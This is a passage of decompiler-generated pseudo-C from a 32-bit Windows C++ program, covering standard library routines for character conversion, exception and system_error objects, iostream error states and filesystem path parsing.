  char v4; // dl
  mbstate_t v6; // [esp+0h] [ebp-14h] BYREF
  char v7[8]; // [esp+8h] [ebp-Ch] BYREF

  v6 = 0i64;
  v3 = _Wcrtomb(v7, a2, &v6, (const _Cvtvec *)(this + 24));
  v4 = v7[0];
  if ( v3 != 1 )
    return a3;
  return v4;
}
// 4029F0: using guessed type char var_C[8];

//----- (00402A40) --------------------------------------------------------
wchar_t *__thiscall sub_402A40(char *this, wchar_t *a2, unsigned int a3, char a4, int a5)
{
  wchar_t *v6; // esi
  unsigned int v7; // edi
  const _Cvtvec *v8; // ecx
  wchar_t v9; // ax
  int v10; // eax
  char v11; // dl
  const _Cvtvec *v13; // [esp+Ch] [ebp-1Ch]
  int v14; // [esp+10h] [ebp-18h]
  mbstate_t v15; // [esp+14h] [ebp-14h] BYREF
  char v16[8]; // [esp+1Ch] [ebp-Ch] BYREF

  v6 = a2;
  v14 = 0;
  v7 = (a3 - (unsigned int)a2 + 1) >> 1;
  if ( (unsigned int)a2 > a3 )
    v7 = 0;
  if ( v7 )
  {
    v8 = (const _Cvtvec *)(this + 24);
    v13 = v8;
    do
    {
      v9 = *v6;
      v15 = 0i64;
      v10 = _Wcrtomb(v16, v9, &v15, v8);
      ++a5;
      v11 = v16[0];
      if ( v10 != 1 )
        v11 = a4;
      v8 = v13;
      *(_BYTE *)(a5 - 1) = v11;
      ++v6;
      ++v14;
    }
    while ( v14 != v7 );
  }
  return v6;
}
// 402A40: using guessed type char var_C[8];

//----- (00402AE0) --------------------------------------------------------
void **__thiscall sub_402AE0(void **this, char a2)
{
  *this = &std::ctype<wchar_t>::`vftable';
  if ( this[4] )
    j___free_base(this[3]);
  j___free_base(this[5]);
  *this = &std::ctype_base::`vftable';
  *this = &std::locale::facet::`vftable';
  *this = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B8420: using guessed type void *std::_Facet_base::`vftable';
// 4B8430: using guessed type void *std::locale::facet::`vftable';
// 4B8440: using guessed type void *std::ctype_base::`vftable';
// 4BD318: using guessed type void *std::ctype<wchar_t>::`vftable';

//----- (00402BA0) --------------------------------------------------------
bool __thiscall sub_402BA0(void *this, int a2, _DWORD *a3)
{
  _DWORD *v3; // eax
  char v5[8]; // [esp+4h] [ebp-8h] BYREF

  v3 = (_DWORD *)(*(int (__thiscall **)(void *, char *, int))(*(_DWORD *)this + 12))(this, v5, a2);
  return *(_DWORD *)(v3[1] + 4) == *(_DWORD *)(a3[1] + 4) && *v3 == *a3;
}
// 402BA0: using guessed type char var_8[8];

//----- (00402BE0) --------------------------------------------------------
bool __thiscall sub_402BE0(_DWORD *this, _DWORD *a2, int a3)
{
  return this[1] == *(_DWORD *)(a2[1] + 4) && *a2 == a3;
}

//----- (00402C10) --------------------------------------------------------
_DWORD *__thiscall sub_402C10(_DWORD *this)
{
  int v2; // ecx
  _DWORD *result; // eax

  if ( !std::_Execute_once(
          (struct std::once_flag *)&unk_4F1538,
          (int (__stdcall *)(void *, void *, void **))sub_4264F0,
          &unk_4F154C) )
    terminate(v2);
  *this = 22;
  result = this;
  this[1] = &unk_4F154C;
  return result;
}
// 402C3F: variable 'v2' is possibly undefined
// 469B45: using guessed type _DWORD __cdecl std::_Execute_once(struct std::once_flag *, int (__stdcall *)(void *, void *, void **), void *);
// 48CEC4: using guessed type void __thiscall __noreturn terminate(_DWORD);

//----- (00402C50) --------------------------------------------------------
_DWORD *__cdecl sub_402C50(_DWORD *a1, int a2)
{
  int v2; // ecx
  _DWORD *result; // eax

  if ( !std::_Execute_once(
          (struct std::once_flag *)&unk_4F1534,
          (int (__stdcall *)(void *, void *, void **))sub_426510,
          &unk_4F1554) )
    terminate(v2);
  result = a1;
  *a1 = a2;
  a1[1] = &unk_4F1554;
  return result;
}
// 402C6C: variable 'v2' is possibly undefined
// 469B45: using guessed type _DWORD __cdecl std::_Execute_once(struct std::once_flag *, int (__stdcall *)(void *, void *, void **), void *);
// 48CEC4: using guessed type void __thiscall __noreturn terminate(_DWORD);

//----- (00402C90) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __userpurge sub_402C90@<eax>(int a1@<ecx>, int a2@<ebp>, int a3, int a4, _DWORD *a5)
{
  int v6; // esi
  int v7; // ecx
  __int128 *v8; // esi
  _DWORD *v9; // eax
  void *v10; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v11; // edx
  bool v12; // cf
  __int128 *v13; // ecx
  void *v14; // ecx
  int v15; // edx
  _DWORD v17[5]; // [esp-78h] [ebp-84h] BYREF
  unsigned int v18; // [esp-64h] [ebp-70h]
  int v19; // [esp-60h] [ebp-6Ch]
  __int128 v20; // [esp-5Ch] [ebp-68h] BYREF
  __int64 v21; // [esp-4Ch] [ebp-58h]
  int v22; // [esp-44h] [ebp-50h]
  __int128 v23; // [esp-40h] [ebp-4Ch] BYREF
  __int64 v24; // [esp-30h] [ebp-3Ch]
  int v25; // [esp-24h] [ebp-30h]
  int v26; // [esp-20h] [ebp-2Ch]
  __int128 *v27; // [esp-1Ch] [ebp-28h] BYREF
  int v28; // [esp-18h] [ebp-24h]
  int *v29; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h]
  void *v31; // [esp-8h] [ebp-14h]
  int v32; // [esp-4h] [ebp-10h]
  int v33; // [esp+0h] [ebp-Ch]
  int v34; // [esp+4h] [ebp-8h]
  int v35; // [esp+8h] [ebp-4h] BYREF
  int retaddr; // [esp+Ch] [ebp+0h]

  v33 = a2;
  v34 = retaddr;
  v32 = -1;
  v31 = &loc_4AB4E2;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v29 = &v35;
  v28 = a1;
  v19 = a1;
  v26 = 0;
  sub_419BE0(&v23, a5);
  v6 = a4;
  v28 = a3;
  v25 = a4;
  v32 = 2;
  v7 = v24;
  v22 = v24;
  if ( (_DWORD)v24 )
  {
    if ( (unsigned int)(HIDWORD(v24) - v24) < 2 )
    {
      LOBYTE(v25) = 0;
      sub_424F60((void **)&v23, 2u, v25, ": ", 2u);
    }
    else
    {
      v8 = &v23;
      if ( HIDWORD(v24) >= 0x10 )
        v8 = (__int128 *)v23;
      LODWORD(v24) = v24 + 2;
      memmove_0((char *)v8 + v7, ": ", 2u);
      *((_BYTE *)v8 + v22 + 2) = 0;
      v6 = v25;
    }
  }
  LOBYTE(v32) = 3;
  v9 = (_DWORD *)(*(int (__thiscall **)(int, _DWORD *, int))(*(_DWORD *)v6 + 8))(v6, v17, v28);
  sub_419910((char *)&v23, v9);
  v26 = 0;
  LOBYTE(v32) = 2;
  if ( v18 >= 0x10 )
  {
    v10 = (void *)v17[0];
    v11 = (struct _EXCEPTION_REGISTRATION_RECORD *)(v18 + 1);
    if ( v18 + 1 >= 0x1000 )
    {
      v10 = *(void **)(v17[0] - 4);
      v11 = (struct _EXCEPTION_REGISTRATION_RECORD *)(v18 + 36);
      if ( (unsigned int)(v17[0] - (_DWORD)v10 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    ExceptionList = v11;
    sub_46C87D(v10);
  }
  v20 = v23;
  v17[4] = 0;
  v18 = 15;
  LOBYTE(v17[0]) = 0;
  v21 = v24;
  v24 = 0xF00000000i64;
  LOBYTE(v23) = 0;
  v26 = 1;
  LOBYTE(v32) = 1;
  v12 = HIDWORD(v21) < 0x10;
  v13 = &v20;
  *(_DWORD *)a1 = &std::exception::`vftable';
  if ( !v12 )
    v13 = (__int128 *)v20;
  ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)(a1 + 4);
  *(_QWORD *)(a1 + 4) = 0i64;
  v24 = 0xF00000000i64;
  LOBYTE(v23) = 0;
  v27 = v13;
  LOBYTE(v28) = 1;
  __std_exception_copy(&v27, ExceptionList);
  *(_DWORD *)a1 = &std::runtime_error::`vftable';
  v26 = 0;
  LOBYTE(v32) = 6;
  if ( HIDWORD(v21) >= 0x10 )
  {
    v14 = (void *)v20;
    v15 = HIDWORD(v21) + 1;
    if ( (unsigned int)(HIDWORD(v21) + 1) >= 0x1000 )
    {
      v14 = *(void **)(v20 - 4);
      v15 = HIDWORD(v21) + 36;
      if ( (unsigned int)(v20 - (_DWORD)v14 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)v15;
    sub_46C87D(v14);
  }
  *(_DWORD *)(a1 + 12) = a3;
  v21 = 0xF00000000i64;
  LOBYTE(v20) = 0;
  *(_DWORD *)a1 = &std::_System_error::`vftable';
  *(_DWORD *)(a1 + 16) = a4;
  v32 = -1;
  return a1;
}
// 402C90: could not find valid save-restore pair for ebp
// 402C90: could not find valid save-restore pair for esi
// 402D79: bad sp value at call
// 402E4C: bad sp value at call
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B83B8: using guessed type void *std::runtime_error::`vftable';
// 4B83C4: using guessed type void *std::_System_error::`vftable';

//----- (00402F00) --------------------------------------------------------
_DWORD *__thiscall sub_402F00(_DWORD *this, char a2)
{
  *this = &std::exception::`vftable';
  __std_exception_destroy(this + 1);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 483827: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';

//----- (00402F70) --------------------------------------------------------
int __thiscall sub_402F70(_DWORD *this)
{
  *this = &std::exception::`vftable';
  return __std_exception_destroy(this + 1);
}
// 483827: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';

//----- (00402FC0) --------------------------------------------------------
_DWORD *__thiscall sub_402FC0(_DWORD *this, int a2, int a3)
{
  void *v4; // ecx
  void *v6[4]; // [esp+14h] [ebp-24h] BYREF
  int v7; // [esp+24h] [ebp-14h]
  unsigned int v8; // [esp+28h] [ebp-10h]
  int v9; // [esp+34h] [ebp-4h]
  int savedregs; // [esp+38h] [ebp+0h] BYREF

  v7 = 0;
  v8 = 15;
  LOBYTE(v6[0]) = 0;
  sub_41EF80(v6, &unk_4CCC25, 0);
  v9 = 0;
  sub_402C90((int)this, (int)&savedregs, a2, a3, v6);
  LOBYTE(v9) = 2;
  if ( v8 >= 0x10 )
  {
    v4 = v6[0];
    if ( v8 + 1 >= 0x1000 )
    {
      v4 = (void *)*((_DWORD *)v6[0] - 1);
      if ( (unsigned int)(v6[0] - v4 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v4);
  }
  v7 = 0;
  v8 = 15;
  LOBYTE(v6[0]) = 0;
  *this = &std::system_error::`vftable';
  v9 = -1;
  return this;
}
// 4B83D0: using guessed type void *std::system_error::`vftable';

//----- (004030B0) --------------------------------------------------------
_DWORD *__thiscall sub_4030B0(_DWORD *this, char a2)
{
  *this = &std::exception::`vftable';
  __std_exception_destroy(this + 1);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 483827: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';

//----- (00403120) --------------------------------------------------------
int __thiscall sub_403120(_DWORD *this)
{
  *this = &std::exception::`vftable';
  return __std_exception_destroy(this + 1);
}
// 483827: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';

//----- (00403170) --------------------------------------------------------
const char *sub_403170()
{
  return "generic";
}

//----- (00403180) --------------------------------------------------------
int __stdcall sub_403180(int a1, int a2)
{
  char *v2; // edx

  v2 = (char *)std::_Syserror_map(a2);
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 15;
  *(_BYTE *)a1 = 0;
  sub_41EF80((void **)a1, v2, strlen(v2));
  return a1;
}
// 46A21C: using guessed type const char *__cdecl std::_Syserror_map(_DWORD);

//----- (00403210) --------------------------------------------------------
void *__thiscall sub_403210(void *this, char a2)
{
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00403230) --------------------------------------------------------
const char *sub_403230()
{
  return "iostream";
}

//----- (00403240) --------------------------------------------------------
int __stdcall sub_403240(int a1, int a2)
{
  char *v2; // edx

  if ( a2 == 1 )
  {
    *(_DWORD *)(a1 + 16) = 0;
    *(_DWORD *)(a1 + 20) = 15;
    *(_BYTE *)a1 = 0;
    sub_41EF80((void **)a1, "iostream stream error", 0x15u);
  }
  else
  {
    v2 = (char *)std::_Syserror_map(a2);
    *(_DWORD *)(a1 + 16) = 0;
    *(_DWORD *)(a1 + 20) = 15;
    *(_BYTE *)a1 = 0;
    sub_41EF80((void **)a1, v2, strlen(v2));
  }
  return a1;
}
// 46A21C: using guessed type const char *__cdecl std::_Syserror_map(_DWORD);

//----- (00403310) --------------------------------------------------------
const char *sub_403310()
{
  return "system";
}

//----- (00403320) --------------------------------------------------------
int __stdcall sub_403320(int a1, DWORD a2)
{
  CHAR *v2; // eax
  unsigned int v3; // eax
  unsigned int v4; // eax
  unsigned int v5; // edi
  unsigned int v6; // edi
  size_t v7; // eax
  void *v8; // eax
  _DWORD *v9; // ebx
  void *v10; // eax

  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 15;
  *(_BYTE *)a1 = 0;
  sub_41EE40((void **)a1, 0x7FFFu, 0);
  v2 = (CHAR *)a1;
  if ( *(_DWORD *)(a1 + 20) >= 0x10u )
    v2 = *(CHAR **)a1;
  v3 = std::_Winerror_message(a2, v2, 0x7FFFu);
  if ( v3 )
    sub_419820((char *)a1, v3, 0);
  else
    sub_41EF80((void **)a1, "unknown error", 0xDu);
  v4 = *(_DWORD *)(a1 + 20);
  if ( v4 >= 0x10 )
  {
    v5 = *(_DWORD *)(a1 + 16);
    if ( v5 < 0x10 )
    {
      sub_41ECD0((void **)a1);
      return a1;
    }
    v6 = v5 | 0xF;
    if ( v6 > 0x7FFFFFFF )
      v6 = 0x7FFFFFFF;
    if ( v6 < v4 )
    {
      if ( v6 + 1 < 0x1000 )
      {
        v9 = operator new(v6 + 1);
      }
      else
      {
        v7 = v6 + 36;
        if ( v6 + 36 <= v6 + 1 )
          v7 = -1;
        v8 = operator new(v7);
        if ( !v8 )
          goto LABEL_23;
        v9 = (_DWORD *)(((unsigned int)v8 + 35) & 0xFFFFFFE0);
        *(v9 - 1) = v8;
      }
      memmove(v9, *(const void **)a1, *(_DWORD *)(a1 + 16) + 1);
      v10 = *(void **)a1;
      if ( (unsigned int)(*(_DWORD *)(a1 + 20) + 1) < 0x1000 )
      {
LABEL_21:
        sub_46C87D(v10);
        *(_DWORD *)a1 = v9;
        *(_DWORD *)(a1 + 20) = v6;
        return a1;
      }
      if ( (unsigned int)v10 - *((_DWORD *)v10 - 1) - 4 <= 0x1F )
      {
        v10 = (void *)*((_DWORD *)v10 - 1);
        goto LABEL_21;
      }
LABEL_23:
      _invalid_parameter_noinfo_noreturn();
    }
  }
  return a1;
}
// 403425: conditional instruction was optimized away because edi.4>=F
// 46A263: using guessed type unsigned int __cdecl std::_Winerror_message(DWORD dwMessageId, LPSTR lpMultiByteStr, DWORD nSize);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00403560) --------------------------------------------------------
void *sub_403560()
{
  int v0; // ecx

  if ( !std::_Execute_once(
          (struct std::once_flag *)&unk_4F1538,
          (int (__stdcall *)(void *, void *, void **))sub_4264F0,
          &unk_4F154C) )
    terminate(v0);
  return &unk_4F154C;
}
// 403579: variable 'v0' is possibly undefined
// 469B45: using guessed type _DWORD __cdecl std::_Execute_once(struct std::once_flag *, int (__stdcall *)(void *, void *, void **), void *);
// 48CEC4: using guessed type void __thiscall __noreturn terminate(_DWORD);

//----- (00403590) --------------------------------------------------------
_DWORD *__thiscall sub_403590(_DWORD *this, char *a2, int *a3)
{
  int v4; // edi
  int v5; // ebx
  void *v6; // ecx
  void *v8[4]; // [esp+18h] [ebp-28h] BYREF
  int v9; // [esp+28h] [ebp-18h]
  unsigned int v10; // [esp+2Ch] [ebp-14h]
  _DWORD *v11; // [esp+30h] [ebp-10h]
  int v12; // [esp+3Ch] [ebp-4h]
  int savedregs; // [esp+40h] [ebp+0h] BYREF

  v11 = this;
  v9 = 0;
  v4 = *a3;
  v5 = a3[1];
  v9 = 0;
  v10 = 15;
  LOBYTE(v8[0]) = 0;
  v11 = a2 + 1;
  sub_41EF80(v8, a2, strlen(a2));
  v12 = 0;
  sub_402C90((int)this, (int)&savedregs, v4, v5, v8);
  LOBYTE(v12) = 2;
  if ( v10 >= 0x10 )
  {
    v6 = v8[0];
    if ( v10 + 1 >= 0x1000 )
    {
      v6 = (void *)*((_DWORD *)v8[0] - 1);
      if ( (unsigned int)(v8[0] - v6 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v6);
  }
  v9 = 0;
  v10 = 15;
  LOBYTE(v8[0]) = 0;
  *this = &std::system_error::`vftable';
  *this = &std::ios_base::failure::`vftable';
  v12 = -1;
  return this;
}
// 4B83D0: using guessed type void *std::system_error::`vftable';
// 4B8480: using guessed type void *std::ios_base::failure::`vftable';

//----- (004036A0) --------------------------------------------------------
int __thiscall sub_4036A0(_DWORD *this, char a2, char a3)
{
  int result; // eax
  int v4; // ecx
  char *v5; // esi
  int *v6; // eax
  int v7; // [esp+4h] [ebp-1Ch] BYREF
  _DWORD pExceptionObject[5]; // [esp+Ch] [ebp-14h] BYREF

  result = a2 & 0x17;
  this[3] = result;
  v4 = result & this[4];
  if ( v4 )
  {
    if ( a3 )
      _CxxThrowException(0, 0);
    if ( (v4 & 4) != 0 )
    {
      v5 = "ios_base::badbit set";
    }
    else
    {
      v5 = "ios_base::failbit set";
      if ( (v4 & 2) == 0 )
        v5 = "ios_base::eofbit set";
    }
    v6 = sub_402C50(&v7, 1);
    sub_403590(pExceptionObject, v5, v6);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
  }
  return result;
}
// 4036A0: using guessed type _DWORD pExceptionObject[5];

//----- (00403720) --------------------------------------------------------
int __thiscall sub_403720(_DWORD *this, int a2)
{
  int v2; // ecx

  v2 = *(_DWORD *)(this[12] + 4);
  *(_DWORD *)(a2 + 4) = v2;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2 + 4))(v2);
  return a2;
}

//----- (00403780) --------------------------------------------------------
void __thiscall sub_403780(struct std::ios_base *this)
{
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
}
// 46A3A4: using guessed type void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 4B856C: using guessed type void *std::ios_base::`vftable';

//----- (004037C0) --------------------------------------------------------
struct std::locale::_Locimp *__thiscall sub_4037C0(_DWORD *this)
{
  _DWORD *v2; // esi
  struct std::locale::_Locimp *result; // eax

  this[12] = 0;
  this[2] = 0;
  this[4] = 0;
  this[5] = 513;
  this[6] = 6;
  this[7] = 0;
  this[8] = 0;
  this[9] = 0;
  this[10] = 0;
  this[11] = 0;
  sub_4036A0(this, 0, 0);
  v2 = operator new(8u);
  *(_QWORD *)v2 = 0i64;
  result = std::locale::_Init(1);
  v2[1] = result;
  this[12] = v2;
  return result;
}
// 469E4D: using guessed type struct std::locale::_Locimp *__cdecl std::locale::_Init(bool);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00403840) --------------------------------------------------------
_DWORD *__thiscall sub_403840(_DWORD *this, char a2)
{
  *this = &std::exception::`vftable';
  __std_exception_destroy(this + 1);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 483827: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';

//----- (004038B0) --------------------------------------------------------
int __thiscall sub_4038B0(_DWORD *this)
{
  *this = &std::exception::`vftable';
  return __std_exception_destroy(this + 1);
}
// 483827: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';

//----- (00403900) --------------------------------------------------------
char *__thiscall sub_403900(char *this, int a2)
{
  sub_403960(this, a2);
  *(_DWORD *)this = &std::ios_base::failure::`vftable';
  return this;
}
// 4B8480: using guessed type void *std::ios_base::failure::`vftable';

//----- (00403960) --------------------------------------------------------
char *__thiscall sub_403960(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &std::runtime_error::`vftable';
  *(_DWORD *)this = &std::_System_error::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  *((_DWORD *)this + 4) = *(_DWORD *)(a2 + 16);
  *(_DWORD *)this = &std::system_error::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B83B8: using guessed type void *std::runtime_error::`vftable';
// 4B83C4: using guessed type void *std::_System_error::`vftable';
// 4B83D0: using guessed type void *std::system_error::`vftable';

//----- (00403A00) --------------------------------------------------------
char *__thiscall sub_403A00(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &std::runtime_error::`vftable';
  *(_DWORD *)this = &std::_System_error::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  *((_DWORD *)this + 4) = *(_DWORD *)(a2 + 16);
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B83B8: using guessed type void *std::runtime_error::`vftable';
// 4B83C4: using guessed type void *std::_System_error::`vftable';

//----- (00403A90) --------------------------------------------------------
struct std::ios_base *__thiscall sub_403A90(struct std::ios_base *this, char a2)
{
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 46A3A4: using guessed type void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 4B856C: using guessed type void *std::ios_base::`vftable';

//----- (00403AF0) --------------------------------------------------------
bool __cdecl sub_403AF0(char a1, FILE *Stream)
{
  return fputc(a1, Stream) != -1;
}

//----- (00403B10) --------------------------------------------------------
bool __cdecl sub_403B10(wchar_t Character, FILE *Stream)
{
  return fputwc(Character, Stream) != 0xFFFFu;
}

//----- (00403B30) --------------------------------------------------------
int __cdecl sub_403B30(__int64 a1)
{
  int v1; // ecx
  int v2; // esi
  int v3; // eax
  int v4; // ecx
  char v6[3]; // [esp+2Dh] [ebp-13h] BYREF
  int v7; // [esp+3Ch] [ebp-4h]

  v2 = v1;
  v7 = 1;
  if ( a1 < 0 )
  {
    v3 = sub_426550(-(int)a1, (unsigned __int64)-a1 >> 32);
    *(_BYTE *)(v3 - 1) = 45;
    v4 = v3 - 1;
  }
  else
  {
    v4 = sub_426550(a1, HIDWORD(a1));
  }
  *(_DWORD *)(v2 + 16) = 0;
  *(_DWORD *)(v2 + 20) = 15;
  *(_BYTE *)v2 = 0;
  if ( (char *)v4 != v6 )
    sub_41EF80((void **)v2, (void *)v4, (size_t)&v6[-v4]);
  return v2;
}
// 403B59: variable 'v1' is possibly undefined

//----- (00403C10) --------------------------------------------------------
bool __stdcall sub_403C10(__int16 a1)
{
  return a1 == 92 || a1 == 47;
}

//----- (00403C30) --------------------------------------------------------
void __noreturn sub_403C30()
{
  int *v0; // eax
  int v1; // [esp+4h] [ebp-1Ch] BYREF
  _DWORD pExceptionObject[5]; // [esp+Ch] [ebp-14h] BYREF

  v0 = sub_402C10(&v1);
  sub_402FC0(pExceptionObject, *v0, v0[1]);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVsystem_error_std__);
}
// 403C30: using guessed type void __noreturn sub_403C30();
// 403C30: using guessed type _DWORD pExceptionObject[5];

//----- (00403C60) --------------------------------------------------------
_DWORD *__fastcall sub_403C60(_DWORD *a1, int a2)
{
  int v4; // ecx
  _DWORD *result; // eax

  if ( !std::_Execute_once(
          (struct std::once_flag *)&unk_4F1530,
          (int (__stdcall *)(void *, void *, void **))sub_426530,
          &unk_4F15A0) )
    terminate(v4);
  *a1 = a2;
  result = a1;
  a1[1] = &unk_4F15A0;
  return result;
}
// 403C8F: variable 'v4' is possibly undefined
// 469B45: using guessed type _DWORD __cdecl std::_Execute_once(struct std::once_flag *, int (__stdcall *)(void *, void *, void **), void *);
// 48CEC4: using guessed type void __thiscall __noreturn terminate(_DWORD);

//----- (00403CA0) --------------------------------------------------------
int __cdecl sub_403CA0(int a1, int a2)
{
  int *v3; // eax
  int v4; // [esp+4h] [ebp-1Ch] BYREF
  _DWORD pExceptionObject[5]; // [esp+Ch] [ebp-14h] BYREF

  if ( a2 )
  {
    v3 = sub_403C60(&v4, a2);
    sub_402FC0(pExceptionObject, *v3, v3[1]);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVsystem_error_std__);
  }
  return a1;
}
// 403CA0: using guessed type _DWORD pExceptionObject[5];

//----- (00403CE0) --------------------------------------------------------
unsigned __int16 *__fastcall sub_403CE0(int a1, unsigned __int16 *a2)
{
  int v4; // edi
  int v5; // ecx
  unsigned __int16 *result; // eax
  int v7; // eax
  __int16 v8; // ax
  int v9; // eax
  int v10; // eax
  int v11; // ecx
  __int16 v12; // [esp+Ch] [ebp-Ch]
  __int16 v13; // [esp+14h] [ebp-4h]

  v4 = ((int)a2 - a1) >> 1;
  if ( v4 < 2 )
    return (unsigned __int16 *)a1;
  if ( (*(_DWORD *)a1 & 0xFFFFFFDF) - 3801153 < 0x1A )
    return (unsigned __int16 *)(a1 + 4);
  v7 = (unsigned __int16)*(_DWORD *)a1;
  v5 = HIWORD(*(_DWORD *)a1);
  if ( v7 != 92 && v7 != 47 )
    return (unsigned __int16 *)a1;
  v8 = HIWORD(*(_DWORD *)a1);
  if ( v4 < 4 )
    goto LABEL_20;
  v9 = *(unsigned __int16 *)(a1 + 6);
  if ( v9 != 92 && v9 != 47 )
  {
    v8 = v5;
    goto LABEL_20;
  }
  v13 = HIWORD(*(_DWORD *)a1);
  if ( v4 != 4 )
  {
    v12 = HIWORD(*(_DWORD *)a1);
    v13 = v12;
    if ( sub_403C10(*(_WORD *)(a1 + 8)) )
    {
      v8 = v12;
      goto LABEL_20;
    }
    LOWORD(v5) = v12;
  }
  if ( sub_403C10(v5) )
  {
    v10 = *(unsigned __int16 *)(a1 + 4);
    if ( v10 == 63 || v10 == 46 )
      return (unsigned __int16 *)(a1 + 6);
  }
  v8 = v13;
  if ( v13 == 63 && *(_WORD *)(a1 + 4) == 63 )
    return (unsigned __int16 *)(a1 + 6);
LABEL_20:
  if ( v4 < 3 || v8 != 92 && v8 != 47 || sub_403C10(*(_WORD *)(a1 + 4)) )
    return (unsigned __int16 *)a1;
  for ( result = (unsigned __int16 *)(a1 + 6); result != a2; ++result )
  {
    v11 = *result;
    if ( v11 == 92 )
      break;
    if ( v11 == 47 )
      break;
  }
  return result;
}

//----- (00403E20) --------------------------------------------------------
int __thiscall sub_403E20(const WCHAR *this, int a2)
{
  const WCHAR *v2; // edi
  unsigned int v3; // ebx
  UINT v4; // eax
  __int64 v5; // rax
  CHAR *v6; // eax
  __int64 v7; // rax
  UINT v9; // [esp+14h] [ebp-18h]
  int v10; // [esp+18h] [ebp-14h]

  v2 = this;
  v3 = *((_DWORD *)this + 4);
  if ( *((_DWORD *)this + 5) >= 8u )
    v2 = *(const WCHAR **)this;
  v4 = __std_fs_code_page();
  v9 = v4;
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 15;
  *(_BYTE *)a2 = 0;
  if ( v3 )
  {
    if ( v3 > 0x7FFFFFFF )
      sub_403C30();
    v5 = __std_fs_convert_wide_to_narrow(v4, v2, v3, 0, 0);
    v10 = sub_403CA0(v5, SHIDWORD(v5));
    sub_419820((char *)a2, v10, 0);
    v6 = (CHAR *)a2;
    if ( *(_DWORD *)(a2 + 20) >= 0x10u )
      v6 = *(CHAR **)a2;
    v7 = __std_fs_convert_wide_to_narrow(v9, v2, v3, v6, v10);
    sub_403CA0(v7, SHIDWORD(v7));
  }
  return a2;
}
// 403C30: using guessed type void __noreturn sub_403C30(void);
// 469395: using guessed type _DWORD __stdcall __std_fs_code_page();
// 4693E6: using guessed type __int64 __stdcall __std_fs_convert_wide_to_narrow(UINT CodePage, LPCWCH lpWideCharStr, _DWORD cchWideChar, LPSTR lpMultiByteStr, _DWORD cbMultiByte);

//----- (00403F60) --------------------------------------------------------
int __thiscall sub_403F60(int *this, char *a2, int a3)
{
  int v3; // esi
  unsigned __int16 *v4; // ebx
  unsigned int v5; // esi
  int result; // eax
  unsigned __int16 *i; // ecx
  int v8; // eax
  unsigned __int16 *v9; // eax
  unsigned __int16 *v10; // esi
  int v11; // eax
  int j; // edx
  int v13; // eax
  bool v14; // al
  int v15; // edx
  BOOL v16; // edx
  int v17; // eax
  int v18; // eax
  unsigned __int16 *v19; // [esp+Ch] [ebp-1Ch]
  unsigned int v20; // [esp+10h] [ebp-18h]
  unsigned int v21; // [esp+14h] [ebp-14h]
  unsigned __int16 *v22; // [esp+18h] [ebp-10h]
  char *v23; // [esp+1Ch] [ebp-Ch]
  unsigned __int16 *v24; // [esp+20h] [ebp-8h]

  v3 = (int)this;
